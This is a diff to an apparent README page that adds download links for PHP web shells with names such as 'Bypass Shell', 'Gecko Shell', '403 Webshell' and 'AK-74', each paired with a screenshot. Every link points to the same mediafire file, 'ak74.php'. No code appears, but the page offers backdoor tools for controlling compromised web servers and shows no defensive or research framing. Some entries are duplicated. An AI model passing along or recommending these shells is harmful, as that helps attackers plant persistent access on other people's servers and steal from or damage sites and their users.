@@ -51,5 +51,26 @@ Date : 20 January 2025 [![Windows Badge](https://img.shields.io/badge/Windows-bl
 # <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">BSHT Shell</a>
 <img src="https://media-hosting.imagekit.io//74a5ea817ec14059/Screenshot%202025-01-23%20160716.png?Expires=1832231253&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=hxZfKlM8wxoWrs-t7Q-maoQVtkGuE78D0L694y4QtDV3DTHsF6uZx5rKKT6NASad8PSiMEBQWg6NE4pC0BAouYh0nPtbDg91~Ekka3l097ZWnF70e~unLXzgTbtD4aUsk1DOf2Rjl3ec3wO50BqoFQ1oZ7uuA5uHsLhXEb6OFAFzPN7Wp-AbL9LUp~f2Nd0hdP8eOVV~12du3Vup30d7My-7za9xS5s~jye6nxEktO-MhhAHBDuztR3ecDz5OmbQKfWhmoKmnAra1WmpvU4VLPxJ64B9ur6OMSXgqoC41fsf0EgUfS4vGiVzqycwY02AceWSw8YCekXwVoODeGnI-w__" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">Uploader Bypass</a>
+<img src="https://media-hosting.imagekit.io//78f00579cb0f4e7c/Screenshot%202025-01-23%20161851.png?Expires=1832232083&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=vtClbKcZ2Ay~drQzoCNTyvfo015daUjwQmp5DsBcRfTGcudmwmSEkelgZBBFBMVYznydNE5lavWbNC5ZRL4rP02bAL2Loo0Uuk1ezurMDzkv6QNOlXeVSlZMUvOmRgqODa2l8KqL8N1GxVA7HFxhcBa2raAkaGh8AnrgmgoXcFoQxVTqTsbsTsVyy2vFVB~T17Fx2jv-XBKHvDuJyC6yUYSmA-gjD4dUIQOEhfmdoFRFAV51BPj2NtD0eK6ZVywU-bMi8UFDJltDw1~WeRgaCNViwZH6Iw8B5nb7v45g~KnjnggTwuKZL8a-nNvFifhuwGNZF55TEgheH6hZ3dqGAQ__" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">Bypass Shell</a>
+<img src="https://media-hosting.imagekit.io//b653cc56814e47a8/Screenshot%202025-01-23%20161902.png?Expires=1832232083&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=S-prTR6pIxtYLy7klmVajfqDYtbt6CBob6LsKutNvawHftpJNgtLXWMvhQbyUDfOPSpSu1cqWXNwTuUE-6QCjYgv69eGf3yu9ATZqxNKw-ByYVji1vFTAVTAtSS9zbv~Y8xNe9ic0tqrpw7-0fKN8YzDR9sGsBpKXJ4Pxrj5tiw5MdYtXM2lnsXPzcIzXCaKr-7t-~5qxVP~p65eQD5TfgepoZzLCD7rjTInGkl4ufal2byDoJuswgLg4Gm6tC0OVKWgK~MKBKKcd720Nt8CNWm0DRMwuPDQqft1ge0odERBHu1tCjzUQnH4hjfaVMAhUipnRXt6zlwnEos7F1T1GA__" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">Gecko Shell</a>
+<img src="https://media-hosting.imagekit.io//9098ed8acbda44cf/Screenshot%202025-01-23%20161916.png?Expires=1832232083&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=R6j9lvrmWJ3luIsla~nZjp0EU2YoSrYjDwOBUXOM6Z7CkBZkiykRptsHDFF997SWQsXyeK9Q6~leJwHy4wYaTp6Tgcopse4lIbu8sr8iHhQD41Yc2UJEFrsEH4Paolj-JjhFd-cV~f0beNFwefgm7rqtRfPFpjlzXVnHU5BdZSiVDtw65zY5qIvwT~bGoWPUkvnp-4dhI5CyhuMpdG9axp3bMwnl7rcgDhjrNQ3lRVB6JlmVLuoeAGdKiP6gkl6tmuvG4SnO72EIkBsoixPVaNIIUrUsOfRzx287Q8xr5WTODbzOVDC6paisfTfBP-X5HPOpuvyxoQm0lIZpTbU8iw__" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">RibelCyberShell Bypass</a>
+<img src="https://media-hosting.imagekit.io//d83870b037ed4a3c/Screenshot%202025-01-23%20161938.png?Expires=1832232083&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=OLcsTCT3FLuqfTR98FMZFMw6tTFU1x1lRdcLR9uI1f3fln2qnkBe6jYGEhIw2SJ0Ihsiq2tJ59VAQtTKfz7Y-jGqlsnpToyl7qqyiYFyKtN9VhXkirDRkOeW2WXuC4OEnZHJUXOLU7K0P70-hz~nTK52pXzFdnSQ24P1yQDcRxKS4sMS4sMDtyE7PlAd4P48NRkrS~2lvJilJ5B6aAJWj9KO5USc3G~N9~fq1Wn4b1Cz1OmbU7B79y3XRiUtT75RDm9Xy6a~ZzsgyEau0h6BX1Fi9MR3GGZNr6V2DGarIEN3oDQI-57Qctvi0A3uUbB~NgiNVu9DJa~l7G9naZuMgA__" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">403 Webshell</a>
+<img src="https://media-hosting.imagekit.io//a8b441676c4b4ef1/Screenshot%202025-01-23%20161955.png?Expires=1832232083&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=nSkpP0eR7zwMLl--fUCDviLh8xSoMp9uffsD2mLZjOebhkgo9hkXU~Yr22BBeTqNC0-P7RYiI5~6~aeKuHd4L5UjtdR2sHIKU1T5KpiTg45cxRi7-pDsc1iIdbUQ37Q6gsayBjyJgG7uVRO~FZxrlmPQnS1vgTZot1GZ5TOxvEE2ib5LlfU9UoLHmeZB-LmWkvITXGiIE5ByuFnUQ6~oERrB31E~wOEhjkE7ToxX9qqDHS8YKOBqc3l-ew3wKd~3d9cVSfAM8rHZrbqCO8ZQNXteTRlXTDXFuDO3rvfMNdKNcI0KttghqI9Ql~Lxn~dk9dAD56Wxc8Mwkam4LjuTXw__" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">AK-74</a>
+<img src="https://i.imgur.com/BuzRpD8.png" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">AK-74</a>
+<img src="https://i.imgur.com/BuzRpD8.png" alt="beruangsalju profile">
+
 # <a href="https://www.mediafire.com/file/1lin6ue84z29ud4/ak74.php/file">AK-74</a>
 <img src="https://i.imgur.com/BuzRpD8.png" alt="beruangsalju profile">
